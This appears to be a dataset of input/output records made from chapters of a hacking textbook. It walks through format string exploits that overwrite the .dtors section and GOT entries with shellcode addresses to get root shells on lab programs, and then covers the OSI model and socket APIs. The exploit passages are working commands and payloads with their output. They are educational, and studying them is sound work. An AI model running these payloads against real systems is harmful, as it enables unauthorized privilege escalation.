automatically executing a function on exit is controlled by\nthe .dtors table section of the binary. This section is an array of 32-bit addresses\nterminated by a NULL address. The array always begins with 0xffffffff\nand ends with the NULL address of 0x00000000. Between these two are the\naddresses of all the functions that have been declared with the destructor\nattribute.\nThe nm command can be used to find the address of the cleanup()\nfunction, and objdump can be used to examine the sections of the binary.\n184 0x300\nreader@hacking:~/booksrc $ nm ./dtors_sample\n080495bc d _DYNAMIC\n08049688 d _GLOBAL_OFFSET_TABLE_\n080484e4 R _IO_stdin_used\nw _Jv_RegisterClasses\n080495a8 d __CTOR_END__\n(cid:0) 080495a4 d __CTOR_LIST__\n(cid:0) 080495b4 d __DTOR_END__\n080495ac d __DTOR_LIST__\n080485a0 r __FRAME_END__\n080495b8 d __JCR_END__\n080495b8 d __JCR_LIST__\n080496b0 A __bss_start\n080496a4 D __data_start\n08048480 t __do_global_ctors_aux\n08048340 t __do_global_dtors_aux\n080496a8 D __dso_handle\nw __gmon_start__\n08048479 T __i686.get_pc_thunk.bx\n080495a4 d __init_array_end\n080495a4 d __init_array_start\n08048400 T __libc_csu_fini\n08048410 T __libc_csu_init\nU __libc_start_main@@GLIBC_2.0\n080496b0 A _edata\n080496b4 A _end\n080484b0 T _fini\n080484e0 R _fp_hw\n0804827c T _init\n080482f0 T _start\n08048314 t call_gmon_start\n080483e8 t cleanup\n080496b0 b completed.1\n080496a4 W data_start\nU exit@@GLIBC_2.0\n08048380 t frame_dummy\n080483b4 T main\n080496ac d p.0\nU printf@@GLIBC_2.0\nreader@hacking:~/booksrc $\nThe nm command shows that the cleanup() function is located at 0x080483e8\n(shown in bold abov(cid:0)e). It also reveals that the .dtors section starts a(cid:2)t 0x080495ac\nwith __DTOR_LIST__ ( ) and ends at 0x080495b4 with __DTOR_END__ ( ). This\nmeans that 0x080495ac should contain 0xffffffff, 0x080495b4 should contain\n0x00000000, and the address between them (0x080495b0) should contain the\naddress of the cleanup() function (0x080483e8).\nThe objdump command shows the actual contents of the .dtors section\n(shown in bold below), although in a slightly confusing format. The first\nvalue of 80495ac is simply showing the address where the .dtors section is\nExploitation 185\nlocated. Then the actual bytes are shown, opposed to DWORDs, which means\nthe bytes are reversed. Bearing this in mind, everything appears to be correct.\nreader@hacking:~/booksrc $ objdump -s -j .dtors ./dtors_sample\n./dtors_sample: file format elf32-i386\nContents of section .dtors:\n80495ac ffffffff e8830408 00000000 ............\nreader@hacking:~/booksrc $\nAn interesting detail about the .dtors section is that it is writable. An object\ndump of the headers will verify this by showing that the .dtors section isn’t\nlabeled READONLY.\nreader@hacking:~/booksrc $ objdump -h ./dtors_sample\n./dtors_sample: file format elf32-i386\nSections:\nIdx Name Size VMA LMA File off Algn\n0 .interp 00000013 08048114 08048114 00000114 2**0\nCONTENTS, ALLOC, LOAD, READONLY, DATA\n1 .note.ABI-tag 00000020 08048128 08048128 00000128 2**2\nCONTENTS, ALLOC, LOAD, READONLY, DATA\n2 .hash 0000002c 08048148 08048148 00000148 2**2\nCONTENTS, ALLOC, LOAD, READONLY, DATA\n3 .dynsym 00000060 08048174 08048174 00000174 2**2\nCONTENTS, ALLOC, LOAD, READONLY, DATA\n4 .dynstr 00000051 080481d4 080481d4 000001d4 2**0\nCONTENTS, ALLOC, LOAD, READONLY, DATA\n5 .gnu.version 0000000c 08048226 08048226 00000226 2**1\nCONTENTS, ALLOC, LOAD, READONLY, DATA\n6 .gnu.version_r 00000020 08048234 08048234 00000234 2**2\nCONTENTS, ALLOC, LOAD, READONLY, DATA\n7 .rel.dyn 00000008 08048254 08048254 00000254 2**2\nCONTENTS, ALLOC, LOAD, READONLY, DATA\n8 .rel.plt 00000020 0804825c 0804825c 0000025c 2**2\nCONTENTS, ALLOC, LOAD, READONLY, DATA\n9 .init 00000017 0804827c 0804827c 0000027c 2**2\nCONTENTS, ALLOC, LOAD, READONLY, CODE\n10 .plt 00000050 08048294 08048294 00000294 2**2\nCONTENTS, ALLOC, LOAD, READONLY, CODE\n11 .text 000001c0 080482f0 080482f0 000002f0 2**4\nCONTENTS, ALLOC, LOAD, READONLY, CODE\n12 .fini 0000001c 080484b0 080484b0 000004b0 2**2\nCONTENTS, ALLOC, LOAD, READONLY, CODE\n13 .rodata 000000bf 080484e0 080484e0 000004e0 2**5\nCONTENTS, ALLOC, LOAD, READONLY, DATA\n14 .eh_frame 00000004 080485a0 080485a0 000005a0 2**2\nCONTENTS, ALLOC, LOAD, READONLY, DATA\n15 .ctors 00000008 080495a4 080495a4 000005a4 2**2\nCONTENTS, ALLOC, LOAD, DATA\n186 0x300\n16 .dtors 0000000c 080495ac 080495ac 000005ac 2**2\nCONTENTS, ALLOC, LOAD, DATA\n17 .jcr 00000004 080495b8 080495b8 000005b8 2**2\nCONTENTS, ALLOC, LOAD, DATA\n18 .dynamic 000000c8 080495bc 080495bc 000005bc 2**2\nCONTENTS, ALLOC, LOAD, DATA\n19 .got 00000004 08049684 08049684 00000684 2**2\nCONTENTS, ALLOC, LOAD, DATA\n20 .got.plt 0000001c 08049688 08049688 00000688 2**2\nCONTENTS, ALLOC, LOAD, DATA\n21 .data 0000000c 080496a4 080496a4 000006a4 2**2\nCONTENTS, ALLOC, LOAD, DATA\n22 .bss 00000004 080496b0 080496b0 000006b0 2**2\nALLOC\n23 .comment 0000012f 00000000 00000000 000006b0 2**0\nCONTENTS, READONLY\n24 .debug_aranges 00000058 00000000 00000000 000007e0 2**3\nCONTENTS, READONLY, DEBUGGING\n25 .debug_pubnames 00000025 00000000 00000000 00000838 2**0\nCONTENTS, READONLY, DEBUGGING\n26 .debug_info 000001ad 00000000 00000000 0000085d 2**0\nCONTENTS, READONLY, DEBUGGING\n27 .debug_abbrev 00000066 00000000 00000000 00000a0a 2**0\nCONTENTS, READONLY, DEBUGGING\n28 .debug_line 0000013d 00000000 00000000 00000a70 2**0\nCONTENTS, READONLY, DEBUGGING\n29 .debug_str 000000bb 00000000 00000000 00000bad 2**0\nCONTENTS, READONLY, DEBUGGING\n30 .debug_ranges 00000048 00000000 00000000 00000c68 2**3\nCONTENTS, READONLY, DEBUGGING\nreader@hacking:~/booksrc $\nAnother interesting detail about the .dtors section is that it is included in\nall binaries compiled with the GNU C compiler, regardless of whether any\nfunctions were declared with the destructor attribute. This means that the\nvulnerable format string program, fmt_vuln.c, must have a .dtors section\ncontaining nothing. This can be inspected using nm and objdump.\nreader@hacking:~/booksrc $ nm ./fmt_vuln | grep DTOR\n08049694 d __DTOR_END__\n08049690 d __DTOR_LIST__\nreader@hacking:~/booksrc $ objdump -s -j .dtors ./fmt_vuln\n./fmt_vuln: file format elf32-i386\nContents of section .dtors:\n8049690 ffffffff 00000000 ........\nreader@hacking:~/booksrc $\nAs this output shows, the distance between __DTOR_LIST__ and __DTOR_END__\nis only four bytes this time, which means there are no addresses between them.\nThe object dump verifies this.\nExploitation 187\nSince the .dtors section is writable, if the address after the 0xffffffff is\noverwritten with a memory address, the program’s execution flow will be\ndirected to that address when the program exits. This will be the address of\n__DTOR_LIST__ plus four, which is 0x08049694 (which also happens to be the\naddress of __DTOR_END__ in this case).\nIf the program is suid root, and this address can be overwritten, it will be\npossible to obtain a root shell.\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat shellcode.bin)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./fmt_vuln\nSHELLCODE will be at 0xbffff9ec\nreader@hacking:~/booksrc $\nShellcode can be put into an environment variable, and the address can\nbe predicted as usual. Since the program name lengths of the helper program\ngetenvaddr.c and the vulnerable fmt_vuln.c program differ by two bytes, the\nshellcode will be located at 0xbffff9ec when fmt_vuln.c is executed. This\naddress simply has to be written into the .dtors section at 0x08049694 (shown\nin bold below) using the format string vulnerability. In the output below the\nshort write method is used.\nreader@hacking:~/booksrc $ gdb -q\n(gdb) p 0xbfff - 8\n$1 = 49143\n(gdb) p 0xf9ec - 0xbfff\n$2 = 14829\n(gdb) quit\nreader@hacking:~/booksrc $ nm ./fmt_vuln | grep DTOR\n08049694 d __DTOR_END__\n08049690 d __DTOR_LIST__\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x96\\x96\\x04\\x08\\x94\\x96\\x04\\\nx08\")%49143x%4\\$hn%14829x%5\\$hn\nThe right way to print user-controlled input:\n????%49143x%4$hn%14829x%5$hn\nThe wrong way to print user-controlled input:\n????\nb7fe75fc\n[*] test_val @ 0x08049794 = -72 0xffffffb8\nsh-3.2# whoami\nroot\nsh-3.2#\nEven though the .dtors section isn’t properly terminated with a NULL\naddress of 0x00000000, the shellcode address is still considered to be a destructor\nfunction. When the program exits, the shellcode will be called, spawning a\nroot shell.\n188 0x300"
  },
  {
    "input": "0x358 Another notesearch Vulnerability",
    "output": "0x358 Another notesearch Vulnerability\nIn addition to the buffer overflow vulnerability, the notesearch program\nfrom Chapter 2 also suffers from a format string vulnerability. This vulner-\nability is shown in bold in the code listing below.\nint print_notes(int fd, int uid, char *searchstring) {\nint note_length;\nchar byte=0, note_buffer[100];\nnote_length = find_user_note(fd, uid);\nif(note_length == -1) // If end of file reached,\nreturn 0; // return 0.\nread(fd, note_buffer, note_length); // Read note data.\nnote_buffer[note_length] = 0; // Terminate the string.\nif(search_note(note_buffer, searchstring)) // If searchstring found,\nprintf(note_buffer); // print the note.\nreturn 1;\n}\nThis function reads the note_buffer from the file and prints the contents\nof the note without supplying its own format string. While this buffer can’t be\ndirectly controlled from the command line, the vulnerability can be exploited\nby sending exactly the right data to the file using the notetaker program and\nthen opening that note using the notesearch program. In the following output,\nthe notetaker program is used to create notes to probe memory in the note-\nsearch program. This tells us that the eighth function parameter is at the\nbeginning of the buffer.\nreader@hacking:~/booksrc $ ./notetaker AAAA$(perl -e 'print \"%x.\"x10')\n[DEBUG] buffer @ 0x804a008: 'AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.'\n[DEBUG] datafile @ 0x804a070: '/var/notes'\n[DEBUG] file descriptor is 3\nNote has been saved.\nreader@hacking:~/booksrc $ ./notesearch AAAA\n[DEBUG] found a 34 byte note for user id 999\n[DEBUG] found a 41 byte note for user id 999\n[DEBUG] found a 5 byte note for user id 999\n[DEBUG] found a 35 byte note for user id 999\nAAAAbffff750.23.20435455.37303032.0.0.1.41414141.252e7825.78252e78 .\n-------[ end of note data ]-------\nreader@hacking:~/booksrc $ ./notetaker BBBB%8\\$x\n[DEBUG] buffer @ 0x804a008: 'BBBB%8$x'\n[DEBUG] datafile @ 0x804a070: '/var/notes'\n[DEBUG] file descriptor is 3\nNote has been saved.\nreader@hacking:~/booksrc $ ./notesearch BBBB\nExploitation 189"
  },
  {
    "input": "0x359 Overwriting the Global Offset Table",
    "output": "[DEBUG] found a 34 byte note for user id 999\n[DEBUG] found a 41 byte note for user id 999\n[DEBUG] found a 5 byte note for user id 999\n[DEBUG] found a 35 byte note for user id 999\n[DEBUG] found a 9 byte note for user id 999\nBBBB42424242\n-------[ end of note data ]-------\nreader@hacking:~/booksrc $\nNow that the relative layout of memory is known, exploitation is just a\nmatter of overwriting the .dtors section with the address of injected shellcode.\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat shellcode.bin)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch\nSHELLCODE will be at 0xbffff9e8\nreader@hacking:~/booksrc $ gdb -q\n(gdb) p 0xbfff - 8\n$1 = 49143\n(gdb) p 0xf9e8 - 0xbfff\n$2 = 14825\n(gdb) quit\nreader@hacking:~/booksrc $ nm ./notesearch | grep DTOR\n08049c60 d __DTOR_END__\n08049c5c d __DTOR_LIST__\nreader@hacking:~/booksrc $ ./notetaker $(printf \"\\x62\\x9c\\x04\\x08\\x60\\x9c\\x04\\\nx08\")%49143x%8\\$hn%14825x%9\\$hn\n[DEBUG] buffer @ 0x804a008: 'b?`?%49143x%8$hn%14825x%9$hn'\n[DEBUG] datafile @ 0x804a070: '/var/notes'\n[DEBUG] file descriptor is 3\nNote has been saved.\nreader@hacking:~/booksrc $ ./notesearch 49143x\n[DEBUG] found a 34 byte note for user id 999\n[DEBUG] found a 41 byte note for user id 999\n[DEBUG] found a 5 byte note for user id 999\n[DEBUG] found a 35 byte note for user id 999\n[DEBUG] found a 9 byte note for user id 999\n[DEBUG] found a 33 byte note for user id 999\n21\n-------[ end of note data ]-------\nsh-3.2# whoami\nroot\nsh-3.2#\n0x359 Overwriting the Global Offset Table\nSince a program could use a function in a shared library many times, it’s\nuseful to have a table to reference all the functions. Another special section in\ncompiled programs is used for this purpose—the procedure linkage table (PLT).\n190 0x300\nThis section consists of many jump instructions, each one corresponding to\nthe address of a function. It works like a springboard—each time a shared\nfunction needs to be called, control will pass through the PLT.\nAn object dump disassembling the PLT section in the vulnerable format\nstring program (fmt_vuln.c) shows these jump instructions:\nreader@hacking:~/booksrc $ objdump -d -j .plt ./fmt_vuln\n./fmt_vuln: file format elf32-i386\nDisassembly of section .plt:\n080482b8 <__gmon_start__@plt-0x10>:\n80482b8: ff 35 6c 97 04 08 pushl 0x804976c\n80482be: ff 25 70 97 04 08 jmp *0x8049770\n80482c4: 00 00 add %al,(%eax)\n...\n080482c8 <__gmon_start__@plt>:\n80482c8: ff 25 74 97 04 08 jmp *0x8049774\n80482ce: 68 00 00 00 00 push $0x0\n80482d3: e9 e0 ff ff ff jmp 80482b8 <_init+0x18>\n080482d8 <__libc_start_main@plt>:\n80482d8: ff 25 78 97 04 08 jmp *0x8049778\n80482de: 68 08 00 00 00 push $0x8\n80482e3: e9 d0 ff ff ff jmp 80482b8 <_init+0x18>\n080482e8 <strcpy@plt>:\n80482e8: ff 25 7c 97 04 08 jmp *0x804977c\n80482ee: 68 10 00 00 00 push $0x10\n80482f3: e9 c0 ff ff ff jmp 80482b8 <_init+0x18>\n080482f8 <printf@plt>:\n80482f8: ff 25 80 97 04 08 jmp *0x8049780\n80482fe: 68 18 00 00 00 push $0x18\n8048303: e9 b0 ff ff ff jmp 80482b8 <_init+0x18>\n08048308 <exit@plt>:\n8048308: ff 25 84 97 04 08 jmp *0x8049784\n804830e: 68 20 00 00 00 push $0x20\n8048313: e9 a0 ff ff ff jmp 80482b8 <_init+0x18>\nreader@hacking:~/booksrc $\nOne of these jump instructions is associated with the exit() function,\nwhich is called at the end of the program. If the jump instruction used for\nthe exit() function can be manipulated to direct the execution flow into\nshellcode instead of the exit() function, a root shell will be spawned. Below,\nthe procedure linking table is shown to be read only.\nExploitation 191\nreader@hacking:~/booksrc $ objdump -h ./fmt_vuln | grep -A1 \"\\ .plt\\ \"\n10 .plt 00000060 080482b8 080482b8 000002b8 2**2\nCONTENTS, ALLOC, LOAD, READONLY, CODE\nBut closer examination of the jump instructions (shown in bold below)\nreveals that they aren’t jumping to addresses but to pointers to addresses. For\nexample, the actual address of the printf() function is stored as a pointer at\nthe memory address 0x08049780, and the exit() function’s address is stored at\n0x08049784.\n080482f8 <printf@plt>:\n80482f8: ff 25 80 97 04 08 jmp *0x8049780\n80482fe: 68 18 00 00 00 push $0x18\n8048303: e9 b0 ff ff ff jmp 80482b8 <_init+0x18>\n08048308 <exit@plt>:\n8048308: ff 25 84 97 04 08 jmp *0x8049784\n804830e: 68 20 00 00 00 push $0x20\n8048313: e9 a0 ff ff ff jmp 80482b8 <_init+0x18>\nThese addresses exist in another section, called the global offset table (GOT),\nwhich is writable. These addresses can be directly obtained by displaying the\ndynamic relocation entries for the binary by using objdump.\nreader@hacking:~/booksrc $ objdump -R ./fmt_vuln\n./fmt_vuln: file format elf32-i386\nDYNAMIC RELOCATION RECORDS\nOFFSET TYPE VALUE\n08049764 R_386_GLOB_DAT __gmon_start__\n08049774 R_386_JUMP_SLOT __gmon_start__\n08049778 R_386_JUMP_SLOT __libc_start_main\n0804977c R_386_JUMP_SLOT strcpy\n08049780 R_386_JUMP_SLOT printf\n08049784 R_386_JUMP_SLOT exit\nreader@hacking:~/booksrc $\nThis reveals that the address of the exit() function (shown in bold above)\nis located in the GOT at 0x08049784. If the address of the shellcode is over-\nwritten at this location, the program should call the shellcode when it thinks\nit’s calling the exit() function.\nAs usual, the shellcode is put in an environment variable, its actual\nlocation is predicted, and the format string vulnerability is used to write the\nvalue. Actually, the shellcode should still be located in the environment from\nbefore, meaning that the only things that need adjustment are the first 16 bytes\nof the format string. The calculations for the %x format parameters will be done\n192 0x300\n(cid:0)\nonce again for clarity. In the output below, the ad(cid:0)dress of the shellcode ( )\nis written into the address of the exit() function ( ).\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat shellcode.bin)\nreader@hacking:~/books(cid:0)rc $ ./getenvaddr SHELLCODE ./fmt_vuln\nSHELLCODE will be at 0xbffff9ec\nreader@hacking:~/booksrc $ gdb -q\n(gdb) p 0xbfff - 8\n$1 = 49143\n(gdb) p 0xf9ec - 0xbfff\n$2 = 14829\n(gdb) quit\nreader@hacking:~/booksrc $ objdump -R ./fmt_vuln\n./fmt_vuln: file format elf32-i386\nDYNAMIC RELOCATION RECORDS\nOFFSET TYPE VALUE\n08049764 R_386_GLOB_DAT __gmon_start__\n08049774 R_386_JUMP_SLOT __gmon_start__\n08049778 R_386_JUMP_SLOT __libc_start_main\n0804977c R_386_JUMP_SLOT strcpy\n(cid:0) 08049780 R_386_JUMP_SLOT printf\n08049784 R_386_JUMP_SLOT exit\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x86\\x97\\x04\\x08\\x84\\x97\\x04\\\nx08\")%49143x%4\\$hn%14829x%5\\$hn\nThe right way to print user-controlled input:\n????%49143x%4$hn%14829x%5$hn\nThe wrong way to print user-controlled input:\n????\nb7fe75fc\n[*] test_val @ 0x08049794 = -72 0xffffffb8\nsh-3.2# whoami\nroot\nsh-3.2#\nWhen fmt_vuln.c tries to call the exit() function, the address of the\nexit() function is looked up in the GOT and is jumped to via the PLT. Since\nthe actual address has been switched with the address for the shellcode in the\nenvironment, a root shell is spawned.\nAnother advantage of overwriting the GOT is that the GOT entries are\nfixed per binary, so a different system with the same binary will have the same\nGOT entry at the same address.\nThe ability to overwrite any arbitrary address opens up many possibilities\nfor exploitation. Basically, any section of memory that is writable and contains\nan address that directs the flow of program execution can be targeted.\nExploitation 193"
  },
  {
    "input": "0x400: Networking",
    "output": "0x400\nN E T W O R K I N G\nCommunication and language have greatly enhanced\nthe abilities of the human race. By using a common\nlanguage, humans are able to transfer knowledge,\ncoordinate actions, and share experiences. Similarly,\nprograms can become much more powerful when they have the ability to\ncommunicate with other programs via a network. The real utility of a web\nbrowser isn’t in the program itself, but in its ability to communicate with\nwebservers.\nNetworking is so prevalent that it is sometimes taken for granted. Many\napplications such as email, the Web, and instant messaging rely on network-\ning. Each of these applications relies on a particular network protocol, but\neach protocol uses the same general network transport methods.\nMany people don’t realize that there are vulnerabilities in the networking\nprotocols themselves. In this chapter you will learn how to network your appli-\ncations using sockets and how to deal with common network vulnerabilities."
  },
  {
    "input": "0x410 OSI Model",
    "output": "0x410 OSI Model\nWhen two computers talk to each other, they need to speak the same lan-\nguage. The structure of this language is described in layers by the OSI model.\nThe OSI model provides standards that allow hardware, such as routers and\nfirewalls, to focus on one particular aspect of communication that applies to\nthem and ignore others. The OSI model is broken down into conceptual\nlayers of communication. This way, routing and firewall hardware can focus\non passing data at the lower layers, ignoring the higher layers of data encap-\nsulation used by running applications. The seven OSI layers are as follows:\nPhysical layer This layer deals with the physical connection between\ntwo points. This is the lowest layer, whose primary role is communicating\nraw bit streams. This layer is also responsible for activating, maintaining,\nand deactivating these bit-stream communications.\nData-link layer This layer deals with actually transferring data between\ntwo points. In contrast with the physical layer, which takes care of send-\ning the raw bits, this layer provides high-level functions, such as error\ncorrection and flow control. This layer also provides procedures for acti-\nvating, maintaining, and deactivating data-link connections.\nNetwork layer This layer works as a middle ground; its primary role is\nto pass information between the lower and the higher layers. It provides\naddressing and routing.\nTransport layer This layer provides transparent transfer of data between\nsystems. By providing reliable data communication, this layer allows the\nhigher layers to never worry about reliability or cost-effectiveness of data\ntransmission.\nSession layer This layer is responsible for establishing and maintaining\nconnections between network applications.\nPresentation layer This layer is responsible for presenting the data to\napplications in a syntax or language they understand. This allows for\nthings like encryption and data compression.\nApplication layer This layer is concerned with keeping track of the\nrequirements of the application.\nWhen data is communicated through these protocol layers, it’s sent in\nsmall pieces called packets. Each packet contains implementations of these\nprotocol layers. Starting from the application layer, the packet wraps the pre-\nsentation layer around that data, which wraps the session layer, which wraps\nthe transport layer, and so forth. This process is called encapsulation. Each\nwrapped layer contains a header and a body. The header contains the pro-\ntocol information needed for that layer, while the body contains the data for\nthat layer. The body of one layer contains the entire package of previously\nencapsulated layers, like the skin of an onion or the functional contexts\nfound on a program’s stack.\n196 0x400\nFor example, whenever you browse the Web, the Ethernet cable and\ncard make up the physical layer, taking care of the transmission of raw bits\nfrom one end of the cable to the other. The next later is the data link layer.\nIn the web browser example, Ethernet makes up this layer, which provides\nthe low-level communications between Ethernet ports on the LAN. This\nprotocol allows for communication between Ethernet ports, but these ports\ndon’t yet have IP addresses. The concept of IP addresses doesn’t exist until\nthe next layer, the network layer. In addition to addressing, this layer is\nresponsible for moving data from one address to another. These three\nlower layers together are able to send packets of data from one IP address\ntoanother. The next layer is the transport layer, which for web traffic is\nTCP;itprovides a seamless bidirectional socket connection. The term TCP/IP\ndescribes the use of TCP on the transport layer and IP on the network layer.\nOther addressing schemes exist at this layer; however, your web traffic\nprobably uses IP version 4 (IPv4). IPv4 addresses follow a familiar form\nofXX.XX.XX.XX. IP version 6 (IPv6) also exists on this layer, with a totally\ndifferent addressing scheme. Since IPv4 is most common, IP will always\nreferto IPv4 in this book.\nThe web traffic itself uses HTTP (Hypertext Transfer Protocol) to com-\nmunicate, which is in the top layer of the OSI model. When you browse the\nWeb, the web browser on your network is communicating across the Internet\nwith the webserver located on a different private network. When this happens,\nthe data packets are encapsulated down to the physical layer where they are\npassed to a router. Since the router isn’t concerned with what’s actually in\nthe packets, it only needs to implement protocols up to the network layer.\nThe router sends the packets out to the Internet, where they reach the other\nnetwork’s router. This router then encapsulates this packet with the lower-\nlayer protocol headers needed for the packet to reach its final destination.\nThis process is shown in the following illustration.\nNetwork 1 Network 2\napplication Internet application\n(7) Application layer\n(6) Presentation layer\n(5) Session layer\n(4) Transport layer\n(3) Network layer\n(2) Data-link layer\n(1) Physical layer\nNetworking 197"
  },
  {
    "input": "0x420 Sockets",
    "output": "All of this packet encapsulation makes up a complex language that hosts\non the Internet (and other types of networks) use to communicate with each\nother. These protocols are programmed into routers, firewalls, and your\ncomputer’s operating system so they can communicate. Programs that use\nnetworking, such as web browsers and email clients, need to interface with\nthe operating system which handles the network communications. Since the\noperating system takes care of the details of network encapsulation, writing\nnetwork programs is just a matter of using the network interface of the OS.\n0x420 Sockets\nA socket is a standard way to perform network communication through the\nOS. A socket can be thought of as an endpoint to a connection, like a socket\non an operator’s switchboard. But these sockets are just a programmer’s\nabstraction that takes care of all the nitty-gritty details of the OSI model\ndescribed above. To the programmer, a socket can be used to send or receive\ndata over a network. This data is transmitted at the session layer (5), above\nthe lower layers (handled by the operating system), which take care of\nrouting. There are several different types of sockets that determine the\nstructure of the transport layer (4). The most common types are stream\nsockets and datagram sockets.\nStream sockets provide reliable two-way communication similar to when\nyou call someone on the phone. One side initiates the connection to the\nother, and after the connection is established, either side can communicate\nto the other. In addition, there is immediate confirmation that what you said\nactually reached its destination. Stream sockets use a standard communica-\ntion protocol called Transmission Control Protocol (TCP), which exists on\nthe transport layer (4) of the OSI model. On computer networks, data is\nusually transmitted in chunks called packets. TCP is designed so that the\npackets of data will arrive without errors and in sequence, like words\narriving at the other end in the order they were spoken when you are\ntalking on the telephone. Webservers, mail servers, and their respective\nclient applications all use TCP and stream sockets to communicate.\nAnother common type of socket is a datagram socket. Communicating\nwith a datagram socket is more like mailing a letter than making a phone call.\nThe connection is one-way only and unreliable. If you mail several letters, you\ncan’t be sure that they arrived in the same order, or even that they reached\ntheir destination at all. The postal service is pretty reliable; the Internet, how-\never, is not. Datagram sockets use another standard protocol called UDP\ninstead of TCP on the transport layer (4). UDP stands for User Datagram\nProtocol, implying that it can be used to create custom protocols. This\nprotocol is very basic and lightweight, with few safeguards built into it. It’s\nnot a real connection, just a basic method for sending data from one point\nto another. With datagram sockets, there is very little overhead in the protocol,\nbut the protocol doesn’t do much. If your program needs to confirm that a\npacket was received by the other side, the other side must be coded to send\nback an acknowledgment packet. In some cases packet loss is acceptable.\n198 0x400"
  },
  {
    "input": "0x421 Socket Functions",
    "output": "Datagram sockets and UDP are commonly used in networked games and\nstreaming media, since developers can tailor their communications exactly\nas needed without the built-in overhead of TCP.\n0x421 Socket Functions\nIn C, sockets behave a lot like files since they use file descriptors to identify\nthemselves. Sockets behave so much like files that you can actually use the\nread() and write() functions to receive and send data using socket file descrip-\ntors. However, there are several functions specifically designed for dealing\nwith sockets. These functions have their prototypes defined in /usr/include/\nsys/sockets.h.\nsocket(int domain, int type, int protocol)\nUsed to create a new socket, returns a file descriptor for the socket or\n-1on error.\nconnect(int fd, struct sockaddr *remote_host, socklen_t addr_length)\nConnects a socket (described by file descriptor fd) to a remote host.\nReturns 0 on success and -1 on error.\nbind(int fd, struct sockaddr *local_addr, socklen_t addr_length)\nBinds a socket to a local address so it can listen for incoming connections.\nReturns 0 on success and -1 on error.\nlisten(int fd, int backlog_queue_size)\nListens for incoming connections and queues connection requests up to\nbacklog_queue_size. Returns 0 on success and -1 on error.\naccept(int fd, sockaddr *remote_host, socklen_t *addr_length)\nAccepts an incoming connection on a bound socket. The address infor-\nmation from the remote host is written into the remote_host structure and\nthe actual size of the address structure is written into *addr_length. This\nfunction returns a new socket file descriptor to identify the connected\nsocket or -1 on error.\nsend(int fd, void *buffer, size_t n, int flags)\nSends n bytes from *buffer to socket fd; returns the number of bytes sent\nor -1 on error.\nrecv(int fd, void *buffer, size_t n, int flags)\nReceives n bytes from socket fd into *buffer; returns the number of bytes\nreceived or -1 on error.\nWhen a socket is created with the socket() function, the domain, type,\nand protocol of the socket must be specified. The domain refers to the pro-\ntocol family of the socket. A socket can be used to communicate using a\nvariety of protocols, from the standard Internet protocol used when you\nbrowse the Web to amateur radio protocols such as AX.25 (when you are\nbeing a gigantic nerd). These protocol families are defined in bits/socket.h,\nwhich is automatically included from sys/socket.h.\nNetworking 199"
  },
  {
    "input": "0x422 Socket Addresses",
    "output": "From /usr/include/bits/socket.h\n/* Protocol families. */\n#define PF_UNSPEC 0 /* Unspecified. */\n#define PF_LOCAL 1 /* Local to host (pipes and file-domain). */\n#define PF_UNIX PF_LOCAL /* Old BSD name for PF_LOCAL. */\n#define PF_FILE PF_LOCAL /* Another nonstandard name for PF_LOCAL. */\n#define PF_INET 2 /* IP protocol family. */\n#define PF_AX25 3 /* Amateur Radio AX.25. */\n#define PF_IPX 4 /* Novell Internet Protocol. */\n#define PF_APPLETALK 5 /* Appletalk DDP. */\n#define PF_NETROM 6 /* Amateur radio NetROM. */\n#define PF_BRIDGE 7 /* Multiprotocol bridge. */\n#define PF_ATMPVC 8 /* ATM PVCs. */\n#define PF_X25 9 /* Reserved for X.25 project. */\n#define PF_INET6 10 /* IP version 6. */\n...\nAs mentioned before, there are several types of sockets, although stream\nsockets and datagram sockets are the most commonly used. The types of sockets\nare also defined in bits/socket.h. (The /* comments */ in the code above are\njust another style that comments out everything between the asterisks.)\nFrom /usr/include/bits/socket.h\n/* Types of sockets. */\nenum __socket_type\n{\nSOCK_STREAM = 1, /* Sequenced, reliable, connection-based byte streams. */\n#define SOCK_STREAM SOCK_STREAM\nSOCK_DGRAM = 2, /* Connectionless, unreliable datagrams of fixed maximum length. */\n#define SOCK_DGRAM SOCK_DGRAM\n...\nThe final argument for the socket() function is the protocol, which should\nalmost always be 0. The specification allows for multiple protocols within a\nprotocol family, so this argument is used to select one of the protocols from\nthe family. In practice, however, most protocol families only have one pro-\ntocol, which means this should usually be set for 0; the first and only protocol\nin the enumeration of the family. This is the case for everything we will do\nwith sockets in this book, so this argument will always be 0 in our examples.\n0x422 Socket Addresses\nMany of the socket functions reference a sockaddr structure to pass address\ninformation that defines a host. This structure is also defined in bits/socket.h,\nas shown on the following page.\n200 0x400\nFrom /usr/include/bits/socket.h\n/* Get the definition of the macro to define the common sockaddr members. */\n#include <bits/sockaddr.h>\n/* Structure describing a generic socket address. */\nstruct sockaddr\n{\n__SOCKADDR_COMMON (sa_); /* Common data: address family and length. */\nchar sa_data[14]; /* Address data. */\n};\nThe macro for SOCKADDR_COMMON is defined in the included bits/sockaddr.h\nfile, which basically translates to an unsigned short int. This value defines\nthe address family of the address, and the rest of the structure is saved for\naddress data. Since sockets can communicate using a variety of protocol\nfamilies, each with their own way of defining endpoint addresses, the defini-\ntion of an address must also be variable, depending on the address family.\nThe possible address families are also defined in bits/socket.h; they usually\ntranslate directly to the corresponding protocol families.\nFrom /usr/include/bits/socket.h\n/* Address families. */\n#define AF_UNSPEC PF_UNSPEC\n#define AF_LOCAL PF_LOCAL\n#define AF_UNIX PF_UNIX\n#define AF_FILE PF_FILE\n#define AF_INET PF_INET\n#define AF_AX25 PF_AX25\n#define AF_IPX PF_IPX\n#define AF_APPLETALK PF_APPLETALK\n#define AF_NETROM PF_NETROM\n#define AF_BRIDGE PF_BRIDGE\n#define AF_ATMPVC PF_ATMPVC\n#define AF_X25 PF_X25\n#define AF_INET6 PF_INET6\n...\nSince an address can contain different types of information, depending\non the address family, there are several other address structures that contain,\nin the address data section, common elements from the sockaddr structure as\nwell as information specific to the address family. These structures are also\nthe same size, so they can be typecast to and from each other. This means\nthat a socket() function will simply accept a pointer to a sockaddr structure,\nwhich can in fact point to an address structure for IPv4, IPv6, or X.25. This\nallows the socket functions to operate on a variety of protocols.\nIn this book we are going to deal with Internet Protocol version 4, which\nis the protocol family PF_INET, using the address family 